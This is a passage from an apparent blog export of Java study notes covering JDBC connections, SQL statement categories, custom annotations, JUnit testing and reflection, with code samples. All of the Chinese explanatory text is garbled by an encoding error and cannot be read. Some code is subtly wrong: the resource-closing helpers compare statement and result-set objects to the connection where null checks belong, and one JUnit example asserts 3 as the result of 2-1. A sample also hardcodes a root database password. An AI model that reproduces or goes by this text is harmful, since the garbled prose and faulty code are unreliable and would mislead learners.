¹æ®æ¥å£å»å®ç°ã€‚æˆ‘ä»¬å¯ä»¥æ˜¯æœ‰è¿™å¥—æ¥å£ç¼–ç¨‹ï¼ŒçœŸæ­£çš„é©±åŠ¨æ—¶jaråŒ…ä¸­çš„å®ç°ç±» å¿«é€Ÿå…¥é—¨ ç®€å•æ­¥éª¤ å¯¼å…¥é©±åŠ¨jaråŒ… æ³¨å†Œé©±åŠ¨ æ•°æ®åº“è¿æ¥å¯¹è±¡Connection å®šä¹‰sql è·å–æ‰§è¡ŒSQLè¯­å¥çš„Statementå¯¹è±¡ æ‰§è¡Œsqlï¼Œæ¥å—è¿”å›ç»“æœ å¤„ç†ç»“æœ é‡Šæ”¾èµ„æº ç®€å•ä½¿ç”¨ 123456789101112131415161718192021222324252627282930package learn.jdbc;import java.sql.Connection;import java.sql.DriverManager;import java.sql.Statement;/*JDBCå¿«é€Ÿå…¥é—¨ */public class JdbcDemo1 &#123; public static void main(String[] args) throws Exception &#123; //1.å¯¼å…¥é©±åŠ¨jaråŒ… //2.æ³¨å†Œé©±åŠ¨ Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;); //3.è·å–æ•°æ®åº“è¿æ¥å¯¹è±¡ Connection conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/javaweb&quot;,&quot;root&quot;,&quot;J8L 7T&quot;); //4.å®šä¹‰sqlè¯­å¥ String sql = &quot;update user set UID=00000 where XH=302&quot;; //5.è·å–æ‰§è¡Œsqlå¯¹è±¡ Statement statement = conn.createStatement(); //6.æ‰§è¡Œsqlæ–¹æ³• int count = statement.executeUpdate(sql); //7.å¤„ç†ç»“æœ System.out.println(count); //8.é‡Šæ”¾èµ„æº statement.close(); conn.close(); &#125;&#125; æ­¥éª¤è¯¦è§£ DriverManagerï¼šé©±åŠ¨ç®¡ç†å¯¹è±¡ æ³¨å†Œé©±åŠ¨ æ³¨å†Œä¸ç»™å®šçš„é©±åŠ¨ç¨‹åº DriverManager 1static void registerDriver(Driver driver) å†™ä»£ç ä½¿ç”¨ 1Class.forName(&quot;com.mysql.jdbc.Driver&quot;); ä¸ºé™æ€ä»£ç ä½¿ç”¨ 12345package com.mysql.cj.jdbc;public class Driver extends com.mysql.cj.jdbc.NonRegisteringDriver implements java.sql.Driver &#123; public Driver() throws java.sql.SQLException &#123; /* compiled code */ &#125;&#125; mysql5.0ä»¥ä¸Šå¯ä»¥ä¸ç”¨æ³¨å†Œé©±åŠ¨ è·å–æ•°æ®åº“è¿æ¥ å°è¯•å»ºç«‹ä¸ç»™å®šæ•°æ®åº“URLçš„è¿æ¥ã€‚ 1static Connection getConnection(String url, String user, String password) urlï¼šjdbc:mysql://ip:port/database é»˜è®¤ä¸ºæœ¬åœ°sqlåœ°å€åŠé»˜è®¤ç«¯å£ Connectionï¼šæ•°æ®åº“è¿æ¥å¯¹è±¡ è·å–æ‰§è¡Œsqlå¯¹è±¡ 1Statement createStatement() 1PreparedStatement prepareStatement(String sql) ç®¡ç†äº‹åŠ¡ å¼€å¯äº‹åŠ¡ï¼šå‚æ•°ä¸ºfalseå³å¼€å¯äº‹åŠ¡ 1void setAutoCommit(boolean autoCommit) æäº¤äº‹åŠ¡ 1void commit() å›æ»šäº‹åŠ¡ 1void rollback() Statementï¼šæ‰§è¡Œsqlå¯¹è±¡ æ‰§è¡Œä»»æ„sql 1boolean execute(String sql) æ‰§è¡ŒDML DDLè¯­å¥ï¼Œè¿”å›å½±å“çš„è¡Œæ•° 1int executeUpdate(String sql) 1ResultSet executeQuery(String sql) ResultSetï¼šç»“æœé›†å¯¹è±¡ PreparedStatementï¼šæ‰§è¡Œsqlå¯¹è±¡ JDBCå·¥å…·ç±»ï¼šJDBCUtils ç›®çš„ï¼šç®€åŒ–ä¹¦å†™ åˆ†æï¼š æ³¨å†Œé©±åŠ¨ä¹ŸæŠ½å– æŠ½å–ä¸€ä¸ªæ–¹æ³•è·å–è¿æ¥å¯¹è±¡ æŠ½å–æ–¹æ³•é‡Šæ”¾èµ„æº æŠ½å–è¿æ¥å¯¹è±¡ 1 closeé‡Šæ”¾èµ„æºé‡è½½ 123456789101112131415161718192021222324252627282930313233343536373839404142public static void close(Statement stmt, Connection conn)&#123; if(stmt != conn)&#123; try &#123; stmt.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; if(conn != null) &#123; try &#123; conn.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125;&#125;//é‡Šæ”¾æ–¹æ³•2public static void close(ResultSet rs, Statement stmt, Connection conn)&#123; if (rs != conn)&#123; try&#123; rs.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; if(stmt != conn)&#123; try &#123; stmt.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; if(conn != null) &#123; try &#123; conn.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125;&#125;","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]},{"title":"JavaWebç¬”è®°-æ•°æ®åº“","slug":"java-d2-database","date":"2022-03-18T08:26:12.000Z","updated":"2023-06-01T14:23:04.393Z","comments":true,"path":"2022/03/18/java-d2-database/","link":"","permalink":"https://joe1sn.eu.org/2022/03/18/java-d2-database/","excerpt":"","text":"SQLåˆ†ç±» æ•°æ®æŸ¥è¯¢è¯­è¨€ï¼ˆDQLï¼‰ æ•°æ®æŸ¥è¯¢è¯­è¨€ï¼ˆData Query Language, DQLï¼‰æ˜¯SQLè¯­è¨€ä¸­ï¼Œè´Ÿè´£è¿›è¡Œæ•°æ®æŸ¥è¯¢è€Œä¸ä¼šå¯¹æ•°æ®æœ¬èº«è¿›è¡Œä¿®æ”¹çš„è¯­å¥ï¼Œè¿™æ˜¯æœ€åŸºæœ¬çš„SQLè¯­å¥ã€‚ä¿ç•™å­—SELECTæ˜¯DQLï¼ˆä¹Ÿæ˜¯æ‰€æœ‰SQLï¼‰ç”¨å¾—æœ€å¤šçš„åŠ¨è¯ï¼Œå…¶ä»–DQLå¸¸ç”¨çš„ä¿ç•™å­—æœ‰FROMï¼ŒWHEREï¼ŒGROUP BYï¼ŒHAVINGå’ŒORDER BYã€‚è¿™äº›DQLä¿ç•™å­—å¸¸ä¸å…¶ä»–ç±»å‹çš„SQLè¯­å¥ä¸€èµ·ä½¿ç”¨ã€‚ æ•°æ®å®šä¹‰è¯­è¨€ï¼ˆDDLï¼‰(CRUD) æ•°æ®å®šä¹‰è¯­è¨€ (Data Definition Language, DDL) æ˜¯SQLè¯­è¨€é›†ä¸­ï¼Œè´Ÿè´£æ•°æ®ç»“æ„å®šä¹‰ä¸æ•°æ®åº“å¯¹è±¡å®šä¹‰çš„è¯­è¨€ï¼Œç”±CREATEã€ALTERä¸DROPä¸‰ä¸ªè¯­æ³•æ‰€ç»„æˆï¼Œæœ€æ—©æ˜¯ç”± Codasyl (Conference on Data Systems Languages) æ•°æ®æ¨¡å‹å¼€å§‹ï¼Œç°åœ¨è¢«çº³å…¥ SQL æŒ‡ä»¤ä¸­ä½œä¸ºå…¶ä¸­ä¸€ä¸ªå­é›†ã€‚ æ•°æ®æ“çºµè¯­è¨€ï¼ˆDMLï¼‰ æ•°æ®æ“çºµè¯­è¨€ï¼ˆData Manipulation Language, DMLï¼‰æ˜¯SQLè¯­è¨€ä¸­ï¼Œè´Ÿè´£å¯¹æ•°æ®åº“å¯¹è±¡è¿è¡Œæ•°æ®è®¿é—®å·¥ä½œçš„æŒ‡ä»¤é›†ï¼Œä»¥INSERTã€UPDATEã€DELETEä¸‰ç§æŒ‡ä»¤ä¸ºæ ¸å¿ƒï¼Œåˆ†åˆ«ä»£è¡¨æ’å…¥ã€æ›´æ–°ä¸åˆ é™¤ã€‚ æ•°æ®æ§åˆ¶è¯­è¨€ï¼ˆDCLï¼‰ æ•°æ®æ§åˆ¶è¯­è¨€ (Data Control Language) åœ¨SQLè¯­è¨€ä¸­ï¼Œæ˜¯ä¸€ç§å¯å¯¹æ•°æ®è®¿é—®æƒè¿›è¡Œæ§åˆ¶çš„æŒ‡ä»¤ï¼Œå®ƒå¯ä»¥æ§åˆ¶ç‰¹å®šç”¨æˆ·è´¦æˆ·å¯¹æ•°æ®è¡¨ã€æŸ¥çœ‹è¡¨ã€é¢„å­˜ç¨‹åºã€ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ç­‰æ•°æ®åº“å¯¹è±¡çš„æ§åˆ¶æƒã€‚ç”± GRANT å’Œ REVOKE ä¸¤ä¸ªæŒ‡ä»¤ç»„æˆã€‚DCLä»¥æ§åˆ¶ç”¨æˆ·çš„è®¿é—®æƒé™ä¸ºä¸»ï¼ŒGRANTä¸ºæˆæƒè¯­å¥ï¼Œå¯¹åº”çš„REVOKEæ˜¯æ’¤é”€æˆæƒè¯­å¥ã€‚ æŒ‡é’ˆæ§åˆ¶è¯­è¨€ï¼ˆCCLï¼‰ å®ƒçš„è¯­å¥ï¼ŒåƒDECLARE CURSORï¼ŒFETCH INTOå’ŒUPDATE WHERE CURRENTç”¨äºå¯¹ä¸€ä¸ªæˆ–å¤šä¸ªè¡¨å•ç‹¬è¡Œçš„æ“ä½œã€‚ äº‹åŠ¡å¤„ç†è¯­è¨€ï¼ˆTPLï¼‰ å®ƒçš„è¯­å¥èƒ½ç¡®ä¿è¢«DMLè¯­å¥å½±å“çš„è¡¨çš„æ‰€æœ‰è¡ŒåŠæ—¶å¾—ä»¥æ›´æ–°ã€‚TPLè¯­å¥åŒ…æ‹¬BEGIN TRANSACTIONï¼ŒCOMMITå’ŒROLLBACKã€‚","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]},{"title":"JavaWebç¬”è®°-æ³¨è§£","slug":"java-d1-annotation","date":"2022-03-16T12:49:29.000Z","updated":"2023-06-01T14:27:37.754Z","comments":true,"path":"2022/03/16/java-d1-annotation/","link":"","permalink":"https://joe1sn.eu.org/2022/03/16/java-d1-annotation/","excerpt":"æ³¨é‡Šéƒ¨åˆ†","text":"æ³¨é‡Šéƒ¨åˆ† æ³¨è§£ æ¦‚å¿µï¼šè¯´æ˜ç¨‹åºã€‚Forè®¡ç®—æœº ä»JDK1.5å¼€å§‹ï¼ŒJavaå¢åŠ å¯¹å…ƒæ•°æ®çš„æ”¯æŒï¼Œä¹Ÿå°±æ˜¯æ³¨è§£ï¼Œæ³¨è§£ä¸æ³¨é‡Šæ˜¯æœ‰ä¸€å®šåŒºåˆ«çš„ï¼Œå¯ä»¥æŠŠæ³¨è§£ç†è§£ä¸ºä»£ç é‡Œçš„ç‰¹æ®Šæ ‡è®°ï¼Œè¿™äº›æ ‡è®°å¯ä»¥åœ¨ç¼–è¯‘ï¼Œç±»åŠ è½½ï¼Œè¿è¡Œæ—¶è¢«è¯»å–ï¼Œå¹¶æ‰§è¡Œç›¸åº”çš„å¤„ç†ã€‚é€šè¿‡æ³¨è§£å¼€å‘äººå‘˜å¯ä»¥åœ¨ä¸æ”¹å˜åŸæœ‰ä»£ç å’Œé€»è¾‘çš„æƒ…å†µä¸‹åœ¨æºä»£ç ä¸­åµŒå…¥è¡¥å……ä¿¡æ¯ã€‚ æ³¨é‡Šï¼šç”¨æ–‡å­—æè¿°ç¨‹åºã€‚Forç¨‹åºå‘˜ ä½œç”¨ ç¼–å†™æ–‡æ¡£ï¼šæ ‡è¯†ç”Ÿæˆdocæ–‡æ¡£ 1234567891011121314package LearnJunit.annotation;/** * æ³¨è§£ java docæ¼”ç¤º * @since 1.5 * @author joe1sn * @version 1.0 */public class AnnoDemo1 &#123; //è®¡ç®—ä¸¤æ•°ä¹‹å’Œ public int add(int a, int b)&#123; return a+b; &#125;&#125; javadoc AnnoDemo1.java -encoding UTF-8 -charset UTF-8 123456789101112131415161718æ­£åœ¨åŠ è½½æºæ–‡ä»¶AnnoDemo1.java...æ­£åœ¨æ„é€  Javadoc ä¿¡æ¯...æ ‡å‡† Doclet ç‰ˆæœ¬ 1.8.0_301æ­£åœ¨æ„å»ºæ‰€æœ‰ç¨‹åºåŒ…å’Œç±»çš„æ ‘...æ­£åœ¨ç”Ÿæˆ.\\AnnoDemo1.html...æ­£åœ¨ç”Ÿæˆ.\\package-frame.html...æ­£åœ¨ç”Ÿæˆ.\\package-summary.html...æ­£åœ¨ç”Ÿæˆ.\\package-tree.html...æ­£åœ¨ç”Ÿæˆ.\\constant-values.html...æ­£åœ¨æ„å»ºæ‰€æœ‰ç¨‹åºåŒ…å’Œç±»çš„ç´¢å¼•...æ­£åœ¨ç”Ÿæˆ.\\overview-tree.html...æ­£åœ¨ç”Ÿæˆ.\\index-all.html...æ­£åœ¨ç”Ÿæˆ.\\deprecated-list.html...æ­£åœ¨æ„å»ºæ‰€æœ‰ç±»çš„ç´¢å¼•...æ­£åœ¨ç”Ÿæˆ.\\allclasses-frame.html...æ­£åœ¨ç”Ÿæˆ.\\allclasses-noframe.html...æ­£åœ¨ç”Ÿæˆ.\\index.html...æ­£åœ¨ç”Ÿæˆ.\\help-doc.html... ä»£ç æ£€æŸ¥ï¼šä»£ç åˆ†æï¼ˆä½¿ç”¨åå°„ï¼‰ ä¾‹å­ï¼š @Override ä¹Ÿå¯ä»¥è‡ªå®šä¹‰æ³¨è§£ã€ä½¿ç”¨åå°„ã€‘ è®©ç¼–è¯‘å™¨å®ç°åŸºæœ¬çš„æ£€æŸ¥ JDKé¢„å®šä¹‰æ³¨è§£ @Override ç¼–è¯‘æ£€æŸ¥ï¼Œæ£€æŸ¥è¢«æ ‡è®°æ–¹æ³•æ˜¯å¦æ˜¯è¢«çˆ¶ç±»è¦†å†™çš„æ–¹æ³• @Deprecated è¯¥æ³¨è§£å†…å®¹å·²è¿‡æ—¶ @SuppressWarnings å‹åˆ¶è­¦å‘Šï¼Œéœ€è¦ä¼ å‚ï¼Œä¸€èˆ¬ä¼ é€’&quot;all&quot;å‹åˆ¶æ‰€æœ‰è­¦å‘Š è‡ªå®šä¹‰æ³¨è§£åŠä½¿ç”¨(è§£æ) æ ¼å¼ 1234@Target(ElementType.METHOD)@Retention(RetentionPolicy.SOURCE)public @interface Override &#123;&#125; 1234å…ƒæ³¨è§£public @interface æ³¨è§£åç§°&#123; å±æ€§åˆ—è¡¨&#125; æœ¬è´¨ï¼šæ³¨è§£æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªæ¥å£ï¼Œæ¥å£é»˜è®¤ç»§æ‰¿Annotation() 12public interface MyAnno extends java.lang.annotation.Annotation &#123;&#125; å±æ€§ï¼šæ¥å£ä¸­å¯ä»¥å®šä¹‰çš„æˆå‘˜æ–¹æ³• è¦æ±‚ï¼š å±æ€§è¿”å›ç±»å‹ åŸºæœ¬æ•°æ®ç±»å‹ String æšä¸¾ æ³¨è§£ ä»¥ä¸Šç±»å‹æ•°ç»„ 1234567public @interface MyAnno &#123; int show1(); String show2(); Person per(); //æšä¸¾ MyAnno2 anno2();//æ³¨è§£ String[] strs();//å­—ç¬¦ä¸²æ•°ç»„&#125; å®šä¹‰çš„å±æ€§åœ¨ä½¿ç”¨æ—¶éœ€è¦ç»™å±æ€§èµ‹å€¼ ç¼ºå°‘èµ‹å€¼ï¼š åªç•™ä¸‹show1è¿›è¡Œèµ‹å€¼ é»˜è®¤èµ‹å€¼ 1234public @interface MyAnno &#123; int age(); String name() default &quot;Doe&quot;;&#125; å¦‚æœåªæœ‰ä¸€ä¸ªå±æ€§éœ€è¦èµ‹å€¼ï¼Œå¦‚æœå±æ€§åç§°æ˜¯valueï¼Œç›´æ¥èµ‹å€¼ 123456package LearnJunit.annotation;@MyAnno(1)public class Worker &#123;&#125; å¯¹äºæšä¸¾ã€æ³¨è§£ã€å­—ç¬¦ä¸²çš„æ³¨è§£ 12345678@MyAnno(age=1, per=Person.P1, anno2=@MyAnno2,// strs=&#123;&quot;1&quot;,&quot;a&quot;,&quot;v&quot;&#125; strs = &quot;abcdefg&quot;)public class Worker &#123;&#125; å…ƒæ³¨è§£ï¼šç”¨äºæè¿°æ³¨è§£çš„æ³¨è§£ @Targetï¼šæè¿°æ³¨è§£èƒ½å¤Ÿä½œç”¨çš„ä½ç½® ElementTypeå–å€¼ï¼š TYPEï¼šä½œç”¨äºç±»ä¸Š METHODï¼šä½œç”¨äºæ–¹æ³•ä¸Š FIELDï¼šä½œç”¨äºæˆå‘˜å˜é‡ä¸Š 12345678//è¡¨ç¤ºanno3æ³¨è§£åªèƒ½ä½œç”¨äºç±»ä¸Š@Target(value = &#123; ElementType.TYPE, ElementType.METHOD, ElementType.FIELD&#125;)public @interface MyAnno3 &#123;&#125; @Retentionï¼šæè¿°æ³¨è§£èƒ½è¢«ä¿ç•™çš„é˜¶æ®µ RetentionPolicyï¼šåˆ¤æ–­åœ¨å“ªä¸ªé˜¶æ®µï¼Œä½¿ç”¨è¯¥æ³¨è§£ SOURCE CLASS RUNTIMEï¼ˆä¸€èˆ¬ä½¿ç”¨è¿™ä¸ªï¼‰ï¼šä¼šä¿ç•™åˆ°classå­—èŠ‚ç æ–‡ä»¶ä¸­ï¼Œå¹¶è¢«JVMè¯»å–åˆ° @Documentedï¼šæè¿°æ³¨è§£æ˜¯å¦è¢«æŠ½å–åˆ°apiæ–‡æ¡£ä¸­ 123456@MyAnno3public class Worker &#123; public String name = &quot;John&quot;; @MyAnno3 public void show()&#123;&#125;;&#125; 1234567891011121314151617181920/** * - @Targetï¼šæè¿°æ³¨è§£èƒ½å¤Ÿä½œç”¨çš„ä½ç½® - @Retentionï¼šæè¿°æ³¨è§£èƒ½è¢«ä¿ç•™çš„é˜¶æ®µ - @Documentedï¼šæè¿°æ³¨è§£æ˜¯å¦è¢«æŠ½å–åˆ°apiæ–‡æ¡£ä¸­ - @Inheritedï¼šæè¿°æ³¨è§£æ˜¯å¦è¿™å­ç±»ç»§æ‰¿ */import java.lang.annotation.*;//è¡¨ç¤ºanno3æ³¨è§£åªèƒ½ä½œç”¨äºç±»ä¸Š@Target(value = &#123; ElementType.TYPE, ElementType.METHOD, ElementType.FIELD&#125;)@Documented@Retention(RetentionPolicy.RUNTIME)public @interface MyAnno3 &#123;&#125; åˆ é™¤è¯¥æ³¨è§£å @Inheritedï¼šæè¿°æ³¨è§£æ˜¯å¦è¢«å­ç±»ç»§æ‰¿ è§£ææ³¨è§£ å°†é…ç½®æ–‡ä»¶çš„å·¥ä½œäº¤ç»™æ³¨è§£å®Œæˆ 123456789/** * æè¿°éœ€è¦æ‰§è¡Œçš„ç±»åå’Œæ–¹æ³•å */@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)public @interface Pro &#123; String className(); String method();&#125; 1234567891011121314151617181920212223242526package LearnJunit.annotation;import LearnJunit.reflect.ReflectDemo1;import java.io.IOException;import java.io.InputStream;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.Properties;//å‡è®¾æ¡†æ¶ç±»@Pro(className = &quot;LearnJunit.annotation.Demo1&quot;, method = &quot;show&quot;)public class ReflectFramework &#123; public static void main(String[] args) throws Exception &#123; //1.è§£ææ³¨è§£ // è·å–è¯¥ç±»çš„å­—èŠ‚ç æ–‡ä»¶å¯¹è±¡ Class&lt;ReflectFramework&gt; reflectFrameworkClass = ReflectFramework.class; //2.è·å¾—æ³¨è§£å¯¹è±¡ // å†…å­˜ä¸­ç”Ÿæˆäº†è¯¥æ³¨è§£æ¥å£çš„ å­ç±»å®ç°å¯¹è±¡ Pro an = reflectFrameworkClass.getAnnotation(Pro.class); //3.è°ƒç”¨æ³¨è§£å¯¹è±¡ä¸­å®šä¹‰çš„æŠ½è±¡æ–¹æ³•ï¼Œè·å–è¿”å›å€¼ String className = an.className(); &#125;&#125; å…³äºæ­¥éª¤2ï¼Œåœ¨ 21è¡Œä¸‹ä¸ªæ–­ç‚¹ è¿™ä¸ªæ—¶å€™æ³¨è§£ç›¸å…³çš„éƒ½è¿˜æ²¡æœ‰å¯¹åº”æ•°æ®ï¼Œä½†æ˜¯è·å¾—äº†æ³¨è§£(.getAnnotation)å¯¹è±¡å ä¸ä»…reflectFrameworkClassæ³¨è§£æœ‰äº†å€¼ï¼Œè€Œä¸”åœ¨å†…å­˜ä¸­å¤šå‡ºäº†ä¸€ä¸ªanå˜é‡ï¼Œè€Œanå°±æ˜¯æˆ‘ä»¬æ³¨è§£çš„å†…å®¹ æœ€ååŠ ä¸Š 1234567//4.åå°„è·å¾—ç±»Class aClass = Class.forName(className);//5.è·å¾—ç±»çš„æ–¹æ³•Method aMethod = aClass.getMethod(methodName);//6.è°ƒç”¨æ–¹æ³•Object aObject = aClass.newInstance();aMethod.invoke(aObject); å°±èƒ½ä½¿ç”¨æ³¨è§£ä¸­çš„ç±»çš„å¯¹åº”æ–¹æ³•äº† æ¡ˆä¾‹ æµ‹è¯•ç±» LearnJunit.annotation.demo.Calculator 123456789101112131415161718192021222324252627package LearnJunit.annotation.demo;public class Calculator &#123; @check public void add() &#123; System.out.println(&quot;1 + 0 = &quot; + (1 + 0)); &#125; @check public void sub() &#123; System.out.println(&quot;1 - 0 = &quot; + (1 - 0)); &#125; @check public void mul() &#123; System.out.println(&quot;1 * 0 = &quot; + (1 * 0)); &#125; @check public void div() &#123; System.out.println(&quot;1 / 0 = &quot; + (1 / 0)); &#125; public void show()&#123; System.out.println(&quot;always normal&quot;); &#125;&#125; æµ‹è¯•æ³¨è§£ LearnJunit.annotation.demo.check 1234567891011package LearnJunit.annotation.demo;import java.lang.annotation.ElementType;import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;import java.lang.annotation.Target;@Target(ElementType.METHOD)@Retention(RetentionPolicy.RUNTIME)public @interface check &#123;&#125; æµ‹è¯•æ–¹æ³• LearnJunit.annotation.demo.testCheck 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package LearnJunit.annotation.demo;import java.io.BufferedWriter;import java.io.FileWriter;import java.io.IOException;import java.lang.reflect.Method;/** * ç®€å•æµ‹è¯•æ¡†æ¶ * æŒ¡ä½æ–¹æ³•æ‰§è¡Œåï¼Œè‡ªåŠ¨æ‰§è¡Œè¢«æ£€æµ‹çš„æ‰€æœ‰æ–¹æ³• */public class testCheck &#123; public static void main(String[] args) throws IOException &#123; //1.åˆ›å»ºè¢«æµ‹è¯•å¯¹è±¡ Calculator calculator = new Calculator(); //2.å¾—åˆ°æ‰€æœ‰å¸¦æ³¨è§£çš„å‡½æ•° int e_num = 0;//å‡ºç°å¼‚å¸¸çš„æ¬¡æ•° BufferedWriter bw = new BufferedWriter(new FileWriter(&quot;bug.txt&quot;));//åˆ›å»ºæ–‡ä»¶å¯¹è±¡ //2.1å¾—åˆ°æ‰€æœ‰å‡½æ•° Method[] methods = calculator.getClass().getMethods(); for (Method method:methods)&#123; //2.2æ£€æµ‹æ˜¯å¦å¸¦æ³¨è§£ if(method.isAnnotationPresent(check.class))&#123; //2.3è‹¥å¸¦æ³¨è§£åˆ™æ‰§è¡Œ try &#123; method.invoke(calculator); &#125; catch(Exception e)&#123; //2.3.1æ•è·å¼‚å¸¸ e.printStackTrace(); //2.3.2è®°å½•åˆ°æ–‡ä»¶ e_num++; bw.write(&quot;+++++&quot;+method.getName()+&quot; æ–¹æ³•å¼‚å¸¸&quot;); bw.newLine(); bw.write(&quot;å¼‚å¸¸åç§°&gt;&gt; &quot;+e.getCause().getClass().getSimpleName()); bw.newLine(); bw.write(&quot;å¼‚å¸¸åŸå› &gt;&gt;&quot;+e.getCause().getMessage()); bw.newLine(); &#125; &#125; &#125; bw.write(&quot;æœ¬æ¬¡æµ‹è¯•ä¸€å…±å‡ºç° &quot;+e_num+&quot; æ¬¡å¼‚å¸¸&quot;); bw.newLine(); bw.flush(); bw.close(); &#125;&#125; å°ç»“ å¤§å¤šæ•°æ—¶å€™ä½¿ç”¨æ³¨è§£è€Œä¸æ˜¯è‡ªå®šä¹‰æ³¨è§£ æ³¨è§£ç»™è°ç”¨ï¼š ç¼–è¯‘å™¨ è§£æç¨‹åºï¼ˆcheckTestï¼‰ æ³¨è§£ä¸æ˜¯ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼ˆç›¸å½“äºCçš„ç¼–è¯‘å‚æ•°ï¼Œå¦‚é¢„ç¼–è¯‘å‘½ä»¤ï¼‰","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]},{"title":"JavaWebç¬”è®°-Junitä¸åå°„","slug":"java-d1-Junit","date":"2022-03-15T23:27:53.000Z","updated":"2023-06-01T14:27:27.120Z","comments":true,"path":"2022/03/16/java-d1-Junit/","link":"","permalink":"https://joe1sn.eu.org/2022/03/16/java-d1-Junit/","excerpt":"Junitå•å…ƒæµ‹è¯•ä¸åå°„ é»‘ç›’-ç™½ç›’","text":"Junitå•å…ƒæµ‹è¯•ä¸åå°„ é»‘ç›’-ç™½ç›’ junitä½¿ç”¨ï¼šç™½ç›’æµ‹è¯• æ­¥éª¤ï¼š å®šä¹‰ä¸€ä¸ªæµ‹è¯•ç±» æµ‹è¯•ç±»åï¼šè¢«æµ‹è¯•ç±»+Test CalculatorTest åŒ…åï¼šxxx.xxx.xxx.test å®šä¹‰æµ‹è¯•æ–¹æ³•ï¼šå¯ä»¥ç‹¬ç«‹æ‰§è¡Œï¼Œå»ºè®® æ–¹æ³•åï¼štestæµ‹è¯•æ–¹æ³•å testAdd() è¿”å›å€¼ï¼švoidï¼ˆç‹¬ç«‹è¿è¡Œï¼‰ å‚æ•°åˆ—è¡¨ï¼šç©ºå‚ æ–¹æ³•+@testæ³¨è§£ å¯¼å…¥Junitä¾èµ–ç¯å¢ƒ 1234567891011121314151617package test;import junit.Calculator;import org.junit.Test;public class CalculatorTest &#123; //æµ‹è¯•addæ–¹æ³• @Test public void testAdd()&#123; //System.out.printf(&quot;Excuted&quot;); //åˆ›å»ºè®¡ç®—å™¨å¯¹è±¡ Calculator c = new Calculator(); //2.è°ƒç”¨addæ–¹æ³• int result = c.add(1,2); System.out.println(result); &#125;&#125; 123456789101112package junit;//è®¡ç®—å™¨public class Calculator &#123; //åŠ æ³• public int add(int a, int b)&#123; return a+b; &#125; //å‡æ³• public int sub(int a, int b)&#123; return a-b; &#125;&#125; åœ¨addæ·»åŠ é™¤0å¼‚å¸¸ 12345678910111213package junit;//è®¡ç®—å™¨public class Calculator &#123; //åŠ æ³• public int add(int a, int b)&#123; int i = 3/0; return a+b; &#125; //å‡æ³• public int sub(int a, int b)&#123; return a-b; &#125;&#125; å‡è®¾åŸæ–¹æ³•ä¸­addå†™æˆäº†-ï¼Œä½¿ç”¨æ–­è¨€æŠ¥é”™ 1234567891011121314151617181920package test;import junit.Calculator;import org.junit.Assert;import org.junit.Test;public class CalculatorTest &#123; //æµ‹è¯•addæ–¹æ³• @Test public void testAdd()&#123; //System.out.printf(&quot;Excuted&quot;); //åˆ›å»ºè®¡ç®—å™¨å¯¹è±¡ Calculator c = new Calculator(); //2.è°ƒç”¨addæ–¹æ³• int result = c.add(1,2); //æ–­è¨€assert Assert.assertEquals(3, result); &#125;&#125; åŒç†å¯ä»¥å¾—åˆ°subçš„æµ‹è¯•å‡½æ•° 1234567//æµ‹è¯•subæ–¹æ³•@Testpublic void testSub()&#123; Calculator c = new Calculator(); int result = c.sub(2,1); Assert.assertEquals(3,result);&#125; æ³¨è§£è¡¥å…… @Before åˆå§‹åŒ–æ–¹æ³• ç”¨äºèµ„æºçš„ç”³è¯·ï¼Œæ‰€æœ‰æµ‹è¯•æ–¹æ³•æ‰§è¡Œä¹‹å‰éƒ½ä¼šå…ˆæ‰§è¡Œè¯¥æ–¹æ³• åœ¨æµ‹è¯•æ–¹æ³•ä¹‹å‰è¢«è‡ªåŠ¨æ‰§è¡Œ @After é‡Šæ”¾èµ„æº åœ¨æ‰€æœ‰æµ‹è¯•æ–¹æ³•æ‰§è¡Œå®Œåéƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œè¯¥æ–¹æ³• æµ‹è¯•æ–¹æ³•æ‰§è¡Œä¹‹åè‡ªåŠ¨æ‰§è¡Œ 12345678910111213//åˆå§‹åŒ–æ–¹æ³•//ç”¨äºèµ„æºçš„ç”³è¯·ï¼Œæ‰€æœ‰æµ‹è¯•æ–¹æ³•æ‰§è¡Œä¹‹å‰éƒ½ä¼šå…ˆæ‰§è¡Œè¯¥æ–¹æ³•@Beforepublic void init()&#123; System.out.println(&quot;init...&quot;);&#125;//é‡Šæ”¾èµ„æº//åœ¨æ‰€æœ‰æµ‹è¯•æ–¹æ³•æ‰§è¡Œå®Œåéƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œè¯¥æ–¹æ³•@Afterpublic void close()&#123; System.out.println(&quot;closed&quot;);&#125; åå°„ æ¡†æ¶è®¾è®¡çš„çµé­‚ æ¡†æ¶ï¼šåŠæˆå“è½¯ä»¶ã€‚å¯ä»¥åœ¨æ¡†æ¶åŸºç¡€ä¸Šç»§ç»­å¼€å‘ï¼Œç®€åŒ–ç¼–ç  åå°„ï¼šå°†ç±»çš„å„ä¸ªç»„æˆéƒ¨åˆ†å°è£…ä¸ºå…¶ä»–å¯¹è±¡ï¼ˆåå°„æœºåˆ¶ï¼‰ 